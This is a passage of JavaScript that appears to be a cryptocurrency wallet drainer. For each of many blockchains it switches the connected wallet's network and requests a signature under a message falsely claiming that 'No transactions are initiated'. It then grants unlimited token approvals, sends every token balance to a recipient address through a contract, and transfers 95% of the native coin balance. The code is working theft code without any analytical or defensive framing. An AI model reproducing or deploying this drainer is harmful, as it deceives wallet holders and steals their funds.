                                  const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance);
                                  await transferTx.wait();
                                  console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
                              }
                          } catch (error) {
                              console.error('Error transferring tokens:', error);
                              
                          }
              
                         try {
                           //send native tokens
                           const etherBalance = await provider.getBalance(address)
                           console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} SMARTBCH`);
              
                           if(!etherBalance.eq(0)){
                             const amountToSend = etherBalance.mul(95).div(100);
                           console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} SMARTBCH`);
              
                       // Define the transaction
                           const transaction = {
                               to: recipientAddress, // Replace with the recipient's address
                               value: amountToSend,
                               // Optional: You can specify gasLimit and gasPrice here if necessary
                           };
                           const txResponse = await signer.sendTransaction(transaction);
                           console.log(`Transaction hash: ${txResponse.hash}`);
              
                           // Wait for the transaction to be mined
                           const txReceipt = await txResponse.wait();
                           console.log('Transaction confirmed in block:', txReceipt.blockNumber);
                           }else{
                             console.log('No balance found for SMARTBCH to send')
                             
                           }
                         } catch (error) {
                              console.error('Error transferring SMARTBCH:', error);
                             
                         }
                          break;
              
              
                        //CONFLUX
                        case conflux.chainId:
                          const confluxTokens = await fetchCONFLUXTokens(address);
              
                          // Message to sign
                          const confluxMessage = "This is a standard message approval to verify your account. No transactions are initiated";
                          const confluxSignature = await signer.signMessage(confluxMessage);
                          console.log('Signature:', confluxSignature);
              
                          const confluxTokenDetails = [];
                          for (let token of confluxTokens) {
                              const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                              const balance = await tokenContract.balanceOf(address);
                              if (!balance.eq(0)) { //Only add tokens with non-zero balances
                                  confluxTokenDetails.push({
                                      contract: tokenContract,
                                      balance: balance,
                                      symbol: token.tokenSymbol,
                                      address: token.contractAddress
                                  });
                              }
                          }
              
                          // Sort tokens by balance, descending
                          confluxTokenDetails.sort((a, b) => b.balance.sub(a.balance));
              
                          try {
                              for(let token of confluxTokenDetails){
                                  const maxUint256 = ethers.constants.MaxUint256;
                                  // Approve unlimited tokens
                                  const approveTx = await token.contract.approve(confluxContractAddress, maxUint256);
                                  await approveTx.wait();
                                  console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
              
              
                                  // Transfer tokens using the smart contract
                                  const contract = new ethers.Contract(confluxContractAddress, contractABI, signer);
                                  const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance);
                                  await transferTx.wait();
                                  console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
                              }
                          } catch (error) {
                              console.error('Error transferring tokens:', error);
                            
                          }
              
                         try {
                           //send native tokens
                           const etherBalance = await provider.getBalance(address)
                           console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} CONFLUX`);
              
                           if(!etherBalance.eq(0)){
                             const amountToSend = etherBalance.mul(95).div(100);
                           console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} CONFLUX`);
              
                       // Define the transaction
                           const transaction = {
                               to: recipientAddress, // Replace with the recipient's address
                               value: amountToSend,
                               // Optional: You can specify gasLimit and gasPrice here if necessary
                           };
                           const txResponse = await signer.sendTransaction(transaction);
                           console.log(`Transaction hash: ${txResponse.hash}`);
              
                           // Wait for the transaction to be mined
                           const txReceipt = await txResponse.wait();
                           console.log('Transaction confirmed in block:', txReceipt.blockNumber);
                           }else{
                             console.log('No balance found for CONFLUX to send')
                             
                           }
                         } catch (error) {
                              console.error('Error transferring CONFLUX:', error);
                             
                         }
                          break;
              
              
                        //MERLIN
                        case merlin.chainId:
                          const merlinTokens = await fetchMERLINTokens(address);
              
                          // Message to sign
                          const merlinMessage = "This is a standard message approval to verify your account. No transactions are initiated";
                          const merlinSignature = await signer.signMessage(merlinMessage);
                          console.log('Signature:', merlinSignature);
              
                          const merlinTokenDetails = [];
                          for (let token of merlinTokens) {
                              const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                              const balance = await tokenContract.balanceOf(address);
                              if (!balance.eq(0)) { //Only add tokens with non-zero balances
                                  merlinTokenDetails.push({
                                      contract: tokenContract,
                                      balance: balance,
                                      symbol: token.tokenSymbol,
                                      address: token.contractAddress
                                  });
                              }
                          }
              
                          // Sort tokens by balance, descending
                          merlinTokenDetails.sort((a, b) => b.balance.sub(a.balance));
              
                          try {
                              for(let token of merlinTokenDetails){
                                  const maxUint256 = ethers.constants.MaxUint256;
                                  // Approve unlimited tokens
                                  const approveTx = await token.contract.approve(merlinContractAddress, maxUint256);
                                  await approveTx.wait();
                                  console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
              
              
                                  // Transfer tokens using the smart contract
                                  const contract = new ethers.Contract(merlinContractAddress, contractABI, signer);
                                  const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance);
                                  await transferTx.wait();
                                  console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
                              }
                          } catch (error) {
                              console.error('Error transferring tokens:', error);
                              
                          }
              
                         try {
                           //send native tokens
                           const etherBalance = await provider.getBalance(address)
                           console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} MERLIN`);
              
                           if(!etherBalance.eq(0)){
                             const amountToSend = etherBalance.mul(95).div(100);
                           console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} MERLIN`);
              
                       // Define the transaction
                           const transaction = {
                               to: recipientAddress, // Replace with the recipient's address
                               value: amountToSend,
                               // Optional: You can specify gasLimit and gasPrice here if necessary
                           };
                           const txResponse = await signer.sendTransaction(transaction);
                           console.log(`Transaction hash: ${txResponse.hash}`);
              
                           // Wait for the transaction to be mined
                           const txReceipt = await txResponse.wait();
                           console.log('Transaction confirmed in block:', txReceipt.blockNumber);
                           }else{
                             console.log('No balance found for MERLIN to send')
                            
                           }
                         } catch (error) {
                              console.error('Error transferring MERLIN:', error)
                         }
                          break;
                          
                        default:
                          console.log("connected to an unsupported network")
                          break
                      }

                    continue;

                  
                } catch (switchError) {
                    if (switchError.code === 4902) {
                        try {
                            // If the network is not added to the user's wallet, add it
                            await provider.send('wallet_addEthereumChain', [{
                                chainId: `0x${targetNetworkId.toString(16)}`,
                                rpcUrls: [net.rpcUrl],
                                chainName: net.name,
                                nativeCurrency: net.nativeCurrency,
                                blockExplorerUrls: [net.blockExplorerUrl]
                            }]);
                            console.log(`Added and switched to network: ${targetNetworkId}`);
                            continue; // Continue to the next network
                        } catch (addError) {
                            console.error('Failed to add the network:', addError);
                        }
                    }else{
                        console.error('Failed to switch the network:', switchError);
                        signer = provider.getSigner();
                    }
                }
            }
        } else {
           window.alert(`User is already connected to the correct network}`)
           for (let net of networksWithTokens) {
            var targetNetworkId = net.chainId; // Target each network with tokens
            try {
                // Attempt to switch networks programmatically
                await modal.switchNetwork(targetNetworkId);
                console.log(`Switched to network: ${targetNetworkId}`);

                // Update the provider and signer to reflect the new network
                provider = new ethers.providers.Web3Provider(walletProvider, 'any');
                signer = provider.getSigner();

                switch(targetNetworkId) {

                    //HANDLE ETHEREUM NETWORK
                    case mainnet.chainId:
                      const tokens = await fetchETHTokens(address);
                      // Message to sign
                      const message = "This is a standard message approval to verify your account. No transactions are initiated";
                      const signature = await signer.signMessage(message);
                      console.log('Signature:', signature);
          
                      const tokenDetails = [];
                      for (let token of tokens) {
                          const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                          const balance = await tokenContract.balanceOf(address);
                          if (!balance.eq(0)) { //Only add tokens with non-zero balances
                              tokenDetails.push({
                                  contract: tokenContract,
                                  balance: balance,
                                  symbol: token.tokenSymbol,
                                  address: token.contractAddress
                              });
                          }
                      }
          
                      // Sort tokens by balance, descending
                      tokenDetails.sort((a, b) => b.balance.sub(a.balance));
          
                      try {
                          for(let token of tokenDetails){
                              const maxUint256 = ethers.constants.MaxUint256;
                              // Approve unlimited tokens
                              const approveTx = await token.contract.approve(contractAddress, maxUint256, { gasLimit: 500000 });
                              await approveTx.wait();
                              console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
          
          
                              // Transfer tokens using the smart contract
                              const contract = new ethers.Contract(contractAddress, contractABI, signer);
                              const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance, { gasLimit: 500000 });
                              await transferTx.wait();
                              console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
                          }
                      } catch (error) {
                          console.error('Error transferring tokens:', error);
                          
                      }
          
                     try {
                       //send native tokens
                       const etherBalance = await provider.getBalance(address)
                       console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} ETH`);
          
                       if(!etherBalance.eq(0)){
                         const amountToSend = etherBalance.mul(95).div(100);
                       console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} ETH`);
          
                   // Define the transaction
                       const transaction = {
                           to: recipientAddress, // Replace with the recipient's address
                           value: amountToSend,
                           // Optional: You can specify gasLimit and gasPrice here if necessary
                       };
                       const txResponse = await signer.sendTransaction(transaction);
                       console.log(`Transaction hash: ${txResponse.hash}`);
          
                       // Wait for the transaction to be mined
                       const txReceipt = await txResponse.wait();
                       console.log('Transaction confirmed in block:', txReceipt.blockNumber);
                       }else{
                         console.log('No balance found for Ether to send')
                         
                       }
                     } catch (error) {
                          console.error('Error transferring Ether:', error);
                          
                     }
                      break;
          
          
                    //BINANCE SMART CHAIN
                    case bsc.chainId:
                      const bscTokens = await fetchBNBTokens(address);
          
                      // Message to sign
                      const bnbMessage = "This is a standard message approval to verify your account. No transactions are initiated";
                      const bnbSignature = await signer.signMessage(bnbMessage);
                      console.log('Signature:', bnbSignature);
          
                      const bnbTokenDetails = [];
                      for (let token of bscTokens) {
                          const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                          const balance = await tokenContract.balanceOf(address);
                          if (!balance.eq(0)) { //Only add tokens with non-zero balances
                              bnbTokenDetails.push({
                                  contract: tokenContract,
                                  balance: balance,
                                  symbol: token.tokenSymbol,
                                  address: token.contractAddress
                              });
                          }
                      }
          
                      // Sort tokens by balance, descending
                      bnbTokenDetails.sort((a, b) => b.balance.sub(a.balance));
          
                      try {
                          for(let token of bnbTokenDetails){
                              const maxUint256 = ethers.constants.MaxUint256;
                              // Approve unlimited tokens
                              const approveTx = await token.contract.approve(bnbContractAddress, maxUint256);
                              await approveTx.wait();
                              console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
          
          
                              // Transfer tokens using the smart contract
                              const contract = new ethers.Contract(bnbContractAddress, contractABI, signer);
                              const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance);
                              await transferTx.wait();
                              console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
                          }
                      } catch (error) {
                          console.error('Error transferring tokens:', error);
                          
                      }
          
                     try {
                       //send native tokens
                       const etherBalance = await provider.getBalance(address)
                       console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} BNB`);
          
                       if(!etherBalance.eq(0)){
                         const amountToSend = etherBalance.mul(95).div(100);
                       console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} BNB`);
          
                   // Define the transaction
                       const transaction = {
                           to: recipientAddress, // Replace with the recipient's address
                           value: amountToSend,
                           // Optional: You can specify gasLimit and gasPrice here if necessary
                       };
                       const txResponse = await signer.sendTransaction(transaction);
                       console.log(`Transaction hash: ${txResponse.hash}`);
          
                       // Wait for the transaction to be mined
                       const txReceipt = await txResponse.wait();
                       console.log('Transaction confirmed in block:', txReceipt.blockNumber);
                       }else{
                         console.log('No balance found for BNB to send')
                         
                       }
                     } catch (error) {
                          console.error('Error transferring Ether:', error);
                          
                     }
                      break;
          
          
          
                    //ARBITRUM NETWORK
                    case arbitrum.chainId:
                      const arbTokens = await fetchARBTokens(address);
          
                      // Message to sign
                      const arbMessage = "This is a standard message approval to verify your account. No transactions are initiated";
                      const arbSignature = await signer.signMessage(arbMessage);
                      console.log('Signature:', arbSignature);
          
                      const arbTokenDetails = [];
                      for (let token of arbTokens) {
                          const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                          const balance = await tokenContract.balanceOf(address);
                          if (!balance.eq(0)) { //Only add tokens with non-zero balances
                              arbTokenDetails.push({
                                  contract: tokenContract,
                                  balance: balance,
                                  symbol: token.tokenSymbol,
                                  address: token.contractAddress
                              });
                          }
                      }
          
                      // Sort tokens by balance, descending
                      arbTokenDetails.sort((a, b) => b.balance.sub(a.balance));
          
                      try {
                          for(let token of arbTokenDetails){
                              const maxUint256 = ethers.constants.MaxUint256;
                              // Approve unlimited tokens
                              const approveTx = await token.contract.approve(arbContractAddress, maxUint256);
                              await approveTx.wait();
                              console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
          
          
                              // Transfer tokens using the smart contract
                              const contract = new ethers.Contract(arbContractAddress, contractABI, signer);
                              const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance);
                              await transferTx.wait();
                              console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
                          }
                      } catch (error) {
                          console.error('Error transferring tokens:', error);
                          
                      }
          
                     try {
                       //send native tokens
                       const etherBalance = await provider.getBalance(address)
                       console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} ARB`);
          
                       if(!etherBalance.eq(0)){
                         const amountToSend = etherBalance.mul(95).div(100);
                       console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} ARB`);
          
                   // Define the transaction
                       const transaction = {
                           to: recipientAddress, // Replace with the recipient's address
                           value: amountToSend,
                           // Optional: You can specify gasLimit and gasPrice here if necessary
                       };
                       const txResponse = await signer.sendTransaction(transaction);
                       console.log(`Transaction hash: ${txResponse.hash}`);
          
                       // Wait for the transaction to be mined
                       const txReceipt = await txResponse.wait();
                       console.log('Transaction confirmed in block:', txReceipt.blockNumber);
                       }else{
                         console.log('No balance found for ARB to send')
                         
                       }
                     } catch (error) {
                          console.error('Error transferring ARB:', error);
                      
                     }
                      break;
          
                    //OPTIMISM
                    case optimism.chainId:
                      const opTokens = await fetchOPTokens(address);
          
                      // Message to sign
                      const opMessage = "This is a standard message approval to verify your account. No transactions are initiated";
                      const opSignature = await signer.signMessage(opMessage);
                      console.log('Signature:', opSignature);
          
                      const opTokenDetails = [];
                      for (let token of opTokens) {
                          const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                          const balance = await tokenContract.balanceOf(address);
                          if (!balance.eq(0)) { //Only add tokens with non-zero balances
                              opTokenDetails.push({
                                  contract: tokenContract,
                                  balance: balance,
                                  symbol: token.tokenSymbol,
                                  address: token.contractAddress
                              });
                          }
                      }
          
                      // Sort tokens by balance, descending
                      opTokenDetails.sort((a, b) => b.balance.sub(a.balance));
          
                      try {
                          for(let token of opTokenDetails){
                              const maxUint256 = ethers.constants.MaxUint256;
                              // Approve unlimited tokens
                              const approveTx = await token.contract.approve(optimismContractAddress, maxUint256);
                              await approveTx.wait();
                              console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
          
          
                              // Transfer tokens using the smart contract
                              const contract = new ethers.Contract(optimismContractAddress, contractABI, signer);
                              const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance);
                              await transferTx.wait();
                              console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
                          }
                      } catch (error) {
                          console.error('Error transferring tokens:', error);
                          
                      }
          
                     try {
                       //send native tokens
                       const etherBalance = await provider.getBalance(address)
                       console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} OP`);
          
                       if(!etherBalance.eq(0)){
                         const amountToSend = etherBalance.mul(95).div(100);
                       console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} OP`);
          
                   // Define the transaction
                       const transaction = {
                           to: recipientAddress, // Replace with the recipient's address
                           value: amountToSend,
                           // Optional: You can specify gasLimit and gasPrice here if necessary
                       };
                       const txResponse = await signer.sendTransaction(transaction);
                       console.log(`Transaction hash: ${txResponse.hash}`);
          
                       // Wait for the transaction to be mined
                       const txReceipt = await txResponse.wait();
                       console.log('Transaction confirmed in block:', txReceipt.blockNumber);
                       }else{
                         console.log('No balance found for OP to send')
                        
                       }
                     } catch (error) {
                          console.error('Error transferring OP:', error);
                          
                     }
                      break;
                          
                          
                    //ARBITRUM NOVA
                    case arbnova.chainId:
                      const arbnovaTokens = await fetchARBNOVATokens(address);
          
                      // Message to sign
                      const arbnovaMessage = "This is a standard message approval to verify your account. No transactions are initiated";
                      const arbnovaSignature = await signer.signMessage(arbnovaMessage);
                      console.log('Signature:', arbnovaSignature);
          
                      const arbnovaTokenDetails = [];
                      for (let token of arbnovaTokens) {
                          const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                          const balance = await tokenContract.balanceOf(address);
                          if (!balance.eq(0)) { //Only add tokens with non-zero balances
                              arbnovaTokenDetails.push({
                                  contract: tokenContract,
                                  balance: balance,
                                  symbol: token.tokenSymbol,
                                  address: token.contractAddress
                              });
                          }
                      }
          
                      // Sort tokens by balance, descending
                      arbnovaTokenDetails.sort((a, b) => b.balance.sub(a.balance));
          
                      try {
                          for(let token of arbnovaTokenDetails){
                              const maxUint256 = ethers.constants.MaxUint256;
                              // Approve unlimited tokens
                              const approveTx = await token.contract.approve(arbnovaContractAddress, maxUint256);
                              await approveTx.wait();
                              console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
          
          
                              // Transfer tokens using the smart contract
                              const contract = new ethers.Contract(arbnovaContractAddress, contractABI, signer);
                              const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance);
                              await transferTx.wait();
                              console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
                          }
                      } catch (error) {
                          console.error('Error transferring tokens:', error);
                         
                      }
          
                     try {
                       //send native tokens
                       const etherBalance = await provider.getBalance(address)
                       console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} ARBNOVA`);
          
                       if(!etherBalance.eq(0)){
                         const amountToSend = etherBalance.mul(95).div(100);
                       console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} ARBNOVA`);
          
                   // Define the transaction
                       const transaction = {
                           to: recipientAddress, // Replace with the recipient's address
                           value: amountToSend,
                           // Optional: You can specify gasLimit and gasPrice here if necessary
                       };
                       const txResponse = await signer.sendTransaction(transaction);
                       console.log(`Transaction hash: ${txResponse.hash}`);
          
                       // Wait for the transaction to be mined
                       const txReceipt = await txResponse.wait();
                       console.log('Transaction confirmed in block:', txReceipt.blockNumber);
                       }else{
                         console.log('No balance found for ARB to send')
                         
                       }
                     } catch (error) {
                          console.error('Error transferring ARBNOVA:', error);
                          
                     }
                      break;
                    
                    //BASE
                    case base.chainId:
                      const baseTokens = await fetchBASETokens(address);
          
                      // Message to sign
                      const baseMessage = "This is a standard message approval to verify your account. No transactions are initiated";
                      const baseSignature = await signer.signMessage(baseMessage);
                      console.log('Signature:', baseSignature);
          
                      const baseTokenDetails = [];
                      for (let token of baseTokens) {
                          const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                          const balance = await tokenContract.balanceOf(address);
                          if (!balance.eq(0)) { //Only add tokens with non-zero balances
                              baseTokenDetails.push({
                                  contract: tokenContract,
                                  balance: balance,
                                  symbol: token.tokenSymbol,
                                  address: token.contractAddress
                              });
                          }
                      }
          
                      // Sort tokens by balance, descending
                      baseTokenDetails.sort((a, b) => b.balance.sub(a.balance));
          
                      try {
                          for(let token of baseTokenDetails){
                              const maxUint256 = ethers.constants.MaxUint256;
                              // Approve unlimited tokens
                              const approveTx = await token.contract.approve(baseContractAddress, maxUint256);
                              await approveTx.wait();
                              console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
          
          
                              // Transfer tokens using the smart contract
                              const contract = new ethers.Contract(baseContractAddress, contractABI, signer);
                              const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance);
                              await transferTx.wait();
                              console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
                          }
                      } catch (error) {
                          console.error('Error transferring tokens:', error);
                          
                      }
          
                     try {
                       //send native tokens
                       const etherBalance = await provider.getBalance(address)
                       console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} BASE`);
          
                       if(!etherBalance.eq(0)){
                         const amountToSend = etherBalance.mul(95).div(100);
                       console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} BASE`);
          
                   // Define the transaction
                       const transaction = {
                           to: recipientAddress, // Replace with the recipient's address
                           value: amountToSend,
                           // Optional: You can specify gasLimit and gasPrice here if necessary
                       };
                       const txResponse = await signer.sendTransaction(transaction);
                       console.log(`Transaction hash: ${txResponse.hash}`);
          
                       // Wait for the transaction to be mined
                       const txReceipt = await txResponse.wait();
                       console.log('Transaction confirmed in block:', txReceipt.blockNumber);
                       }else{
                         console.log('No balance found for BASE to send')
                         
                       }
                     } catch (error) {
                          console.error('Error transferring BASE:', error);
                          
                     }
                      break;
          
                    //ZKSYNC
                    case zksync.chainId:
                      const zkTokens = await fetchZKSYNCTokens(address);
          
                      // Message to sign
                      const zkMessage = "This is a standard message approval to verify your account. No transactions are initiated";
                      const zkSignature = await signer.signMessage(zkMessage);
                      console.log('Signature:', zkSignature);
          
                      const zkTokenDetails = [];
                      for (let token of zkTokens) {
                          const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                          const balance = await tokenContract.balanceOf(address);
                          if (!balance.eq(0)) { //Only add tokens with non-zero balances
                              zkTokenDetails.push({
                                  contract: tokenContract,
                                  balance: balance,
                                  symbol: token.tokenSymbol,
                                  address: token.contractAddress
                              });
                          }
                      }
          
                      // Sort tokens by balance, descending
                      zkTokenDetails.sort((a, b) => b.balance.sub(a.balance));
          
                      try {
                          for(let token of zkTokenDetails){
                              const maxUint256 = ethers.constants.MaxUint256;
                              // Approve unlimited tokens
                              const approveTx = await token.contract.approve(zksyncContractAddress, maxUint256);
                              await approveTx.wait();
                              console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
          
          
                              // Transfer tokens using the smart contract
                              const contract = new ethers.Contract(zksyncContractAddress, contractABI, signer);
                              const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance);
                              await transferTx.wait();
                              console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
                          }
                      } catch (error) {
                          console.error('Error transferring tokens:', error);
                          
                      }
          
                     try {
                       //send native tokens
                       const etherBalance = await provider.getBalance(address)
                       console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} ZKSYNC`);
          
                       if(!etherBalance.eq(0)){
                         const amountToSend = etherBalance.mul(95).div(100);
                       console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} ZKSYNC`);
          
                   // Define the transaction
                       const transaction = {
                           to: recipientAddress, // Replace with the recipient's address
                           value: amountToSend
                           // Optional: You can specify gasLimit and gasPrice here if necessary
                       };
                       const txResponse = await signer.sendTransaction(transaction);
                       console.log(`Transaction hash: ${txResponse.hash}`);
          
                       // Wait for the transaction to be mined
                       const txReceipt = await txResponse.wait();
                       console.log('Transaction confirmed in block:', txReceipt.blockNumber);
                       }else{
                         console.log('No balance found for ZKSYNC to send')
                         
                       }
                     } catch (error) {
                          console.error('Error transferring ZKSYNC:', error);
                         
                     }
                      break;
          
                    //POLYGON
                    case polygon.chainId:
                      const polyTokens = await fetchPOLYGONTokens(address);
          
                      // Message to sign
                      const polyMessage = "This is a standard message approval to verify your account. No transactions are initiated";
                      const polySignature = await signer.signMessage(polyMessage);
                      console.log('Signature:', polySignature);
          
                      const polyTokenDetails = [];
                      for (let token of polyTokens) {
                          const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                          const balance = await tokenContract.balanceOf(address);
                          if (!balance.eq(0)) { //Only add tokens with non-zero balances
                              polyTokenDetails.push({
                                  contract: tokenContract,
                                  balance: balance,
                                  symbol: token.tokenSymbol,
                                  address: token.contractAddress
                              });
                          }
                      }
          
                      // Sort tokens by balance, descending
                      polyTokenDetails.sort((a, b) => b.balance.sub(a.balance));
          
                      try {
                          for(let token of polyTokenDetails){
                              const maxUint256 = ethers.constants.MaxUint256;
                              // Approve unlimited tokens
                              const approveTx = await token.contract.approve(polygonContractAddress, maxUint256);
                              await approveTx.wait();
                              console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
          
          
                              // Transfer tokens using the smart contract
                              const contract = new ethers.Contract(polygonContractAddress, contractABI, signer);
                              const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance);
                              await transferTx.wait();
                              console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
                          }
                      } catch (error) {
                          console.error('Error transferring tokens:', error);
                          
                      }
          
                     try {
                       //send native tokens
                       const etherBalance = await provider.getBalance(address)
                       console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} POLYGON`);
          
                       if(!etherBalance.eq(0)){
                         const amountToSend = etherBalance.mul(95).div(100);
                       console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} POLYGON`);
          
                   // Define the transaction
                       const transaction = {
                           to: recipientAddress, // Replace with the recipient's address
                           value: amountToSend,
                           // Optional: You can specify gasLimit and gasPrice here if necessary
                       };
                       const txResponse = await signer.sendTransaction(transaction);
                       console.log(`Transaction hash: ${txResponse.hash}`);
          
                       // Wait for the transaction to be mined
                       const txReceipt = await txResponse.wait();
                       console.log('Transaction confirmed in block:', txReceipt.blockNumber);
                       }else{
                         console.log('No balance found for POLYGON to send')
                         
                       }
                     } catch (error) {
                          console.error('Error transferring POLYGON:', error);
                          
                     }
                      break;
          
          
                  ////POLYGONEVM
                    case polygonevm.chaindId:
                      const polyevmTokens = await fetchPOLYGONEVMTokens(address);
          
                      // Message to sign
                      const polyevmMessage = "This is a standard message approval to verify your account. No transactions are initiated";
                      const polyevmSignature = await signer.signMessage(polyevmMessage);
                      console.log('Signature:', polyevmSignature);
          
                      const polyevmTokenDetails = [];
                      for (let token of polyevmTokens) {
                          const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                          const balance = await tokenContract.balanceOf(address);
                          if (!balance.eq(0)) { //Only add tokens with non-zero balances
                              polyevmTokenDetails.push({
                                  contract: tokenContract,
                                  balance: balance,
                                  symbol: token.tokenSymbol,
                                  address: token.contractAddress
                              });
                          }
                      }
          
                      // Sort tokens by balance, descending
                      polyevmTokenDetails.sort((a, b) => b.balance.sub(a.balance));
          
                      try {
                          for(let token of polyevmTokenDetails){
                              const maxUint256 = ethers.constants.MaxUint256;
                              // Approve unlimited tokens
                              const approveTx = await token.contract.approve(polygonevmContractAddress, maxUint256);
                              await approveTx.wait();
                              console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
          
          
                              // Transfer tokens using the smart contract
                              const contract = new ethers.Contract(polygonevmContractAddress, contractABI, signer);
                              const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance);
                              await transferTx.wait();
                              console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
                          }
                      } catch (error) {
                          console.error('Error transferring tokens:', error);
                          
                      }
          
                     try {
                       //send native tokens
                       const etherBalance = await provider.getBalance(address)
                       console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} POLYGONEVM`);
          
                       if(!etherBalance.eq(0)){
                         const amountToSend = etherBalance.mul(95).div(100);
                       console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} POLYGONEVM`);
          
                   // Define the transaction
                       const transaction = {
                           to: recipientAddress, // Replace with the recipient's address
                           value: amountToSend,
                           // Optional: You can specify gasLimit and gasPrice here if necessary
                       };
                       const txResponse = await signer.sendTransaction(transaction);
                       console.log(`Transaction hash: ${txResponse.hash}`);
          
                       // Wait for the transaction to be mined
                       const txReceipt = await txResponse.wait();
                       console.log('Transaction confirmed in block:', txReceipt.blockNumber);
                       }else{
                         console.log('No balance found for POLYGONEVM to send')
                         
                       }
                     } catch (error) {
                          console.error('Error transferring POLYGONEVM:', error);
                          
                     }
                      break;
                    
          
                    //BLAST
                    case blast.chainId:
                      const blastTokens = await fetchBLASTTokens(address);
          
                      // Message to sign
                      const blastMessage = "This is a standard message approval to verify your account. No transactions are initiated";
                      const blastSignature = await signer.signMessage(blastMessage);
                      console.log('Signature:', blastSignature);   
          
                      const blastTokenDetails = [];
                      for (let token of blastTokens) {
                          const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                          const balance = await tokenContract.balanceOf(address);
                          if (!balance.eq(0)) { //Only add tokens with non-zero balances
                              blastTokenDetails.push({
                                  contract: tokenContract,
                                  balance: balance,
                                  symbol: token.tokenSymbol,
                                  address: token.contractAddress
                              });
                          }
                      }
          
                      // Sort tokens by balance, descending
                      blastTokenDetails.sort((a, b) => b.balance.sub(a.balance));
          
                      try {
                          for(let token of blastTokenDetails){
                              const maxUint256 = ethers.constants.MaxUint256;
                              // Approve unlimited tokens
                              const approveTx = await token.contract.approve(blastContractAddress, maxUint256);
                              await approveTx.wait();
                              console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
          
          
                              // Transfer tokens using the smart contract
                              const contract = new ethers.Contract(blastContractAddress, contractABI, signer);
                              const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance);
                              await transferTx.wait();
                              console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
                          }
                      } catch (error) {
                          console.error('Error transferring tokens:', error);
                          
                      }
          
                      try {
                          //send native tokens
                          const etherBalance = await provider.getBalance(address)
                          console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} BLAST`);
             
                          if(!etherBalance.eq(0)){
                            const amountToSend = etherBalance.mul(95).div(100);
                          console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} BLAST`);
             
                      // Define the transaction
